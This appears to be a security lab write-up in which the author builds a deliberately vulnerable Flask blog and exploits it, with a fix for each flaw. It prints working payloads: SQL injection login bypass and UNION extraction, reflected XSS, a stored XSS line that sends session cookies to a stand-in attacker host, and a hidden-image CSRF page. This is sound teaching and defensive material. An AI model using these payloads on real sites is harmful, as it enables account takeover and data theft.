# Session 6 — Web Application Attacks (VulnBlog)

## Objective
Build a deliberately vulnerable web application from scratch using
Python Flask, then exploit it using the OWASP Top 10 most common
vulnerabilities. Understanding the code behind each vulnerability
before exploiting it.

## Setup
- VulnBlog: custom Flask app built for this lab
- Stack: Python Flask + SQLite + Jinja2
- Running on Ubuntu_principal port 5000
- Attacker: Kali Linux with Burp Suite

## Application structure

    vulnblog/
    app.py          # Flask server - routes and request handling
    database.py     # SQLite interaction - all queries
    templates/      # Jinja2 HTML templates
    static/         # CSS

## Legal disclaimer
All attacks documented here were performed against systems owned
and controlled by the author in an isolated local environment.
Do not use these techniques against systems you do not own or
have explicit permission to test.

---

## Vulnerability 1 — SQL Injection: Login bypass

**Location:** app.py — login() function
**MITRE:** T1190 — Exploit Public-Facing Application

**Vulnerable code:**

    query = "SELECT * FROM users WHERE username = '"
            + username
            + "' AND password = '"
            + password + "'"

**Why it is vulnerable:**
String concatenation builds the SQL query using raw user input.
The attacker controls the query structure, not just the values.

**Payload — field: username:**

    admin' --

**Generated query:**

    SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'

The -- comments out everything after it, including password verification.

**Result:** Logged in as admin without knowing the password.

**Fix:**

    cursor.execute(
        "SELECT * FROM users WHERE username = ? AND password = ?",
        (username, password)
    )

Parameterized queries separate code from data. The ? placeholders
are filled by the database driver safely — user input can never
change the query structure.

---

## Vulnerability 2 — SQL Injection: UNION data extraction

**Location:** database.py — search_posts()
**MITRE:** T1213 — Data from Information Repositories

**Vulnerable code:**

    sql = "SELECT * FROM posts WHERE title LIKE '%"
          + query
          + "%' OR content LIKE '%"
          + query + "%'"

**Why it is vulnerable:**
Same concatenation issue. The UNION keyword lets the attacker
append a second query and merge its results with the original.

**Step 1 — confirm number of columns:**

    ' ORDER BY 6--

No error = table has at least 6 columns (id, title, content, author, date, user_id).

**Step 2 — UNION payload:**

    ' UNION SELECT 1,username,password,email,date,user_id FROM users--

**Generated query:**

    SELECT * FROM posts WHERE title LIKE '%'
    UNION SELECT 1,username,password,email,date,user_id FROM users--
    %'

**Result:** All usernames and plaintext passwords from the users table
displayed on the search results page, mixed with normal post results.

**Fix:** Use parameterized queries with LIKE:

    cursor.execute(
        "SELECT * FROM posts WHERE title LIKE ? OR content LIKE ?",
        ('%' + query + '%', '%' + query + '%')
    )

---

## Vulnerability 3 — XSS Reflected

**Location:** templates/search.html
**MITRE:** T1059.007 — JavaScript

**Vulnerable code in template:**

    Resultados para: <strong>{{ query | safe }}</strong>

**Why it is vulnerable:**
The Jinja2 pipe safe disables HTML escaping. User input is rendered
directly as HTML instead of as text.

**Payload — in the search field or URL:**

    http://192.168.100.16:5000/search?q=<img src=x onerror=alert(1)>

**Note:** Classic script tags were blocked by the browser.
The img onerror event bypasses browser XSS filters because
it does not require a script tag.

**Result:** JavaScript executed in the victim browser when they
visit the crafted URL. An attacker sends this URL via email or
chat — the victim clicks it and the script runs with the
privileges of the VulnBlog session.

**Fix:** Remove pipe safe and let Jinja2 auto-escape handle it:

    Resultados para: <strong>{{ query }}</strong>

Jinja2 converts < to &lt; and > to &gt; — the browser displays
the text but never executes it as code.

---

## Vulnerability 4 — XSS Stored + Session Hijacking

**Location:** templates/post.html and templates/profile.html
**MITRE:** T1539 — Steal Web Session Cookie

**Vulnerable code in template:**

    {{ post['content'] | safe }}

**Why it is vulnerable:**
Same as XSS Reflected but the payload is stored in the database.
Every user who views the post triggers the attack — not just
users who click a crafted link.

**Prerequisite — disable HttpOnly in app.py:**

    app.config['SESSION_COOKIE_HTTPONLY'] = False

Without this, document.cookie returns empty because the browser
protects cookies with HttpOnly from JavaScript access.

**Setup on Kali — start a listener to receive cookies:**

    mkdir /tmp/cookiethief
    cd /tmp/cookiethief
    python3 -m http.server 8000

**Payload — paste as post content (replace KALI_IP):**

    <img src=x onerror="var i=new Image();i.src='http://KALI_IP:8000/?c='+document.cookie">

**Result:** Every user who views the post sends their session
cookie to the attacker server. Visible in the Kali terminal:

    GET /?c=session=eyJrZXkiOiJ2YWx1ZSJ9 200

**Session hijacking — use the stolen cookie:**
1. Open browser DevTools (F12)
2. Application tab > Cookies > http://192.168.100.16:5000
3. Double click the session cookie value
4. Replace with the stolen value
5. Reload the page — now logged in as the victim

**Fix:** Remove pipe safe and never store unescaped user input:

    {{ post['content'] }}

Also keep SESSION_COOKIE_HTTPONLY = True (the Flask default).
HttpOnly prevents JavaScript from reading cookies even if XSS
exists — it limits the damage.

---

## Vulnerability 5 — IDOR (Insecure Direct Object Reference)

**Location:** app.py — profile() route
**MITRE:** T1083 — File and Directory Discovery

**Vulnerable code:**

    @app.route('/profile/<int:user_id>')
    def profile(user_id):
        profile_user = database.get_user_by_id(user_id)
        # No check: does the current user have permission to see this?
        return render_template('profile.html', profile_user=profile_user, user=user)

**Why it is vulnerable:**
The server takes the ID directly from the URL and returns that
user without verifying if the requester has permission to view it.

**Exploit — just change the number in the URL:**

    /profile/1  → admin full profile (email visible)
    /profile/2  → another user profile
    /profile/3  → enumerate all existing users

**Result:** Full profile data of any user accessible by any
authenticated user. No special privileges required.

**Fix — verify the requester owns the resource or is admin:**

    @app.route('/profile/<int:user_id>')
    def profile(user_id):
        current_user = get_current_user()
        if not current_user or current_user['id'] != user_id:
            return "Access denied", 403
        profile_user = database.get_user_by_id(user_id)
        return render_template('profile.html', profile_user=profile_user, user=current_user)

---

## Vulnerability 6 — CSRF (Cross-Site Request Forgery)

**Location:** app.py — delete_post() route
**MITRE:** T1204 — User Execution

**Vulnerable code:**

    @app.route('/post/delete/<int:post_id>')
    def delete_post(post_id):
        # Problem 1: destructive action via GET, not POST
        # Problem 2: no CSRF token to verify request origin
        user = get_current_user()
        if user:
            database.delete_post(post_id, user['id'])
        return redirect(url_for('index'))

**Why it is vulnerable:**
The browser automatically sends session cookies with every request
to the domain — even requests triggered by visiting another site.
With no CSRF token, the server cannot distinguish a legitimate
user action from a forged one.

**Attack page — evil.html (hosted on Kali):**

    <!DOCTYPE html>
    <html>
    <body>
      <h1>Win a free iPhone!</h1>
      <img src="http://192.168.100.16:5000/post/delete/2"
           style="display:none">
    </body>
    </html>

**Serve from Kali:**

    python3 -m http.server 9000

**When the logged-in victim visits http://KALI_IP:9000/evil.html:**
The browser loads the hidden image, sends a GET request to VulnBlog
with the victim's session cookie attached automatically.
The post is deleted without the victim clicking anything on VulnBlog.

**Result:** Post 2 deleted without the owner's knowledge or consent.

**Fix 1 — use POST for destructive actions:**

    @app.route('/post/delete/<int:post_id>', methods=['POST'])

**Fix 2 — add a CSRF token:**
Flask-WTF handles this automatically. The token is a random value
tied to the user's session — a forged request from another site
cannot include the correct token because it cannot read the victim's
cookies (blocked by Same-Origin Policy).

---

## Summary — root cause of every vulnerability

Every vulnerability in this app shares the same root cause:
trusting user input without validation or verification.

| # | Vulnerability | Root cause | Fix |
|---|---|---|---|
| 1 | SQL Injection login | String concatenation in query | Parameterized queries |
| 2 | SQL Injection search | String concatenation in query | Parameterized queries |
| 3 | XSS Reflected | pipe safe in template | Remove pipe safe |
| 4 | XSS Stored | pipe safe + no sanitization | Remove pipe safe, keep HttpOnly |
| 5 | IDOR | No authorization check | Verify ownership before returning data |
| 6 | CSRF | GET for destructive action, no token | POST + CSRF token |

## MITRE ATT&CK mapping

- T1190 — Exploit Public-Facing Application
- T1213 — Data from Information Repositories
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1539 — Steal Web Session Cookie
- T1083 — File and Directory Discovery
- T1204 — User Execution
